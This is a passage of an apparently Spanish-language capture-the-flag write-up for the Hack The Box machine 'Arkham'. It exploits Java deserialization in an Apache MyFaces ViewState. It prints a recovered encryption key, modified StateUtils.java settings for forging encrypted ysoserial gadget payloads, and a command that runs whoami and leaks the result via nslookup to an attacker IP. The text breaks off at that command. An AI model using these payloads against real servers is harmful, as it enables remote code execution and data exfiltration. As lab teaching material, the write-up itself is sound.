&lt;p&gt;En el caso de MyFaces encriptar el &lt;code&gt;ViewState&lt;/code&gt; esta por defecto activado, puede ser desactivado para hacer tests configurando el parametro de &lt;code&gt;org.apache.myfaces.USE_ENCRYPTION = false&lt;/code&gt; y tambien puede utilizar una contraseña para la encriptacion. Tambien nos dice que por defecto Myfaces utiliza &lt;code&gt;DES&lt;/code&gt; como algoritmo de encriptacion y &lt;code&gt;HMAC-SHA1&lt;/code&gt; para autenticar el ViewState. Por defecto el almacenamiento del ViewState esta configurado por el lado del servidor &lt;code&gt;javax.faces.STATE_SAVING_METHOD = server&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;INFO:&lt;/strong&gt; &lt;a href=&#34;https://wiki.apache.org/myfaces/Secure_Your_Application&#34;&gt;&lt;strong&gt;Secure Your Application&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Algunos post sobre JAVA Deseralization:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/&#34;&gt;&lt;strong&gt;Java Serialization&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/&#34;&gt;&lt;strong&gt;Java Serialization with burp and ysoserial&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a&#34;&gt;&lt;strong&gt;Deserialization Vulnerability - $1500&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ahora que sabemos todo esto, podemos volver a nuestro archivo &lt;code&gt;web.xml.bak&lt;/code&gt; el cual contiene algunos parametros que pueden ser de utilidad para aprovechar el RCE del ViewState y ejecutar comandos dentro de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;javax.faces.STATE_SAVING_METHOD&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;server&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien tiene una contraseña que es utilizada para encriptar el viewstate.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.SECRET&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El algoritmo de autenticacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_ALGORITHM&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;HmacSHA1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Mensaje de autenticacion para el algoritmo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_SECRET&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;stateutilsjava&#34;&gt;StateUtils.java&lt;/h2&gt;
&lt;p&gt;Existen algunas herramientas para explotacion de deserializacion en java como &lt;a href=&#34;https://github.com/joaomatosf/jexboss&#34;&gt;&lt;strong&gt;jexboss&lt;/strong&gt;&lt;/a&gt; y &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;&lt;strong&gt;ysoserial&lt;/strong&gt;&lt;/a&gt;, tambien existe una version modificada de &lt;a href=&#34;https://github.com/pimps/ysoserial-modified&#34;&gt;&lt;strong&gt;ysoserial-modified&lt;/strong&gt;&lt;/a&gt;. Al intentar utilizar estas herramientas contra la maquina no funcionan, por el tipo de encriptacion en la configuracion del archivo (&lt;code&gt;web.xml.bak&lt;/code&gt;), estas herramientas aprovechan el viewstatate cuando no estan encriptadas.&lt;/p&gt;
&lt;p&gt;Para arkham vamos a utilizar ysoserial-modified para generar un payload y encriptarlo por medio de la clase de &lt;a href=&#34;https://github.com/apache/myfaces&#34;&gt;&lt;strong&gt;apache myfaces&lt;/strong&gt;&lt;/a&gt;, StateUtils.java, esta clase &lt;a href=&#34;https://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html&#34;&gt;&lt;strong&gt;StateUtils.java&lt;/strong&gt;&lt;/a&gt; contiene metodos que pueden construir y reconstruir un valor de viewstate.&lt;/p&gt;
&lt;p&gt;Configuracion de los campos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Logger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Logger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLogger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StateUtils&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//Cambio por HmacSHA1
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macAlgorithm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;HmacSHA1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//Cambio por MAC_SECRET -&amp;gt; SnNGOTg3Ni0=
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//public static final String INIT_MAC_SECRET = &amp;#34;MAC_SECRET&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//public static final String INIT_MAC_SECRET_KEY_CACHE = &amp;#34;org.apache.myfaces.MAC_SECRET.CACHE&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//configuracion Local encrypt/decrypt
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encodedKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SnNGOTg3Ni0=&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;        
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decodedKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encodedKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKey&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secretKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKeySpec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decodedKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;DES&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;    
&lt;span class=&#34;c1&#34;&gt;//configuracion Local encrypt/decrypt
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macSecretStr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;SnNGOTg3Ni0=&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macSecretBytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;macSecretStr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKey&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macSecretKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKeySpec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;macSecretBytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macAlgorithm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;    
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ZIP_CHARSET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ISO-8859-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// String DEFAULT_ALGORITHM = &amp;#34;DES&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;algorithm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;DES&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// String DEFAULT_ALGORITHM_PARAMS = &amp;#34;ECB/PKCS5Padding&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;algorithmParams&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ECB/PKCS5Padding&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Metodos, se eliminan todos los valores ExternalContext, ServletContext:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;construct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;n&#34;&gt;reconstruct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;insecure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    
&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;getAsObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;getAsByteArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un metodo para enviar nuestro payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;sendPayload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;viewstatePayload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para la ejecucion de comandos utilizamos ysoserial-modified.jar para generar un payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;CommonsCollections1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;em&gt;Funciona tambien con la version ysoserial.jar, pero se tienen comandos &amp;lsquo;limitados&amp;rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Ya que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: &lt;code&gt;nslookup CommonsCollections1 10.10.1X.1X&lt;/code&gt;) y el payload que funcione nos aparecerá en nuestra terminal (Utilizamos &lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;&lt;strong&gt;responder&lt;/strong&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Aqui se encuentra el codigo:&lt;/p&gt;
&lt;h4 id=&#34;codigo-java---githubhttpsgithubcomsckullctf-stufftreemasterarkham&#34;&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/tree/master/arkham&#34;&gt;&lt;strong&gt;Codigo Java - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.&lt;/p&gt;
&lt;h4 id=&#34;codigo-python---githubhttpsgithubcomsckullctf-stuffblobmasterarkhamdeserialization-javapy&#34;&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/arkham/deserialization-java.py&#34;&gt;&lt;strong&gt;Codigo Python - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/h4&gt;
&lt;h2 id=&#34;rce---request-dns&#34;&gt;RCE - Request DNS&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2017-49.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son &lt;code&gt;CommonsCollections5, CommonsCollections6&lt;/code&gt;, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.&lt;/p&gt;
&lt;p&gt;De igual forma utilizando nslookup podemos saber que usuario somos y que usuarios existen en la maquina, utilizando los siguientes comandos.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;whoami&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;//10.10.13.129 &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; /f %i in &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; nslookup %i 10.10.13.129
